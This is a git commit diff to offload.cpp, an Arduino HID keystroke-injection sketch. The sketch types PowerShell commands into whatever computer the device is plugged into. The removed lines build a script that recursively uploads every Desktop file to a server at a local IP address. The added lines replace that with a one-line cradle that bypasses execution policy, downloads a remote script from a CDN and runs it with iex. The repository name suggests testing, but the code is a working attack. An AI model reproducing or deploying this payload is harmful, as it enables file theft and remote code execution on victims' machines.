26f0de0be12fd056d5ec9bc5df7ea5d663bd2323
Greg <135546587+Greg4268@users.noreply.github.com>
2025-05-14 11:19:21 -0500

    using cdn

--- offload.cpp
+++ offload.cpp
@@ -29,28 +29,10 @@ void openPowerShell(){
 void deployScript() {
   delay(500);
 
-  // Write the script to a temporary .ps1 file
-  Keyboard.print("$f='C:\\Users\\Public\\temp.ps1';");
+  Keyboard.print("powershell -ExecutionPolicy Bypass -Command ");
+  Keyboard.print("\"iwr -useb https://cdn.jsdelivr.net/gh/Greg4268/Arduino_HID_Testing@main/script.ps1 | iex\"");
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-
-  delay(200);
-
-  // Start appending script to the file
-  typeScriptLine("Add-Content $f '$d=[Environment]::GetFolderPath(\\'Desktop\\')'");
-  typeScriptLine("Add-Content $f '$u=\\'http://192.168.6.114:5000/upload\\''");
-  typeScriptLine("Add-Content $f '$fs=Get-ChildItem -Path $d -Recurse -File'");
-  typeScriptLine("Add-Content $f 'foreach($f in $fs){try{$b= @{file=(Get-Item $f.FullName)};Invoke-RestMethod -Uri $u -Method Post -Form $b}catch{}}'");
-
-  // Run the script
-  typeScriptLine("powershell -ExecutionPolicy Bypass -File $f");
 }
 
-void typeScriptLine(const char* line) {
-  Keyboard.print(line);
-  Keyboard.press(KEY_RETURN);
-  delay(200);
-  Keyboard.releaseAll();
-  delay(300);
-}
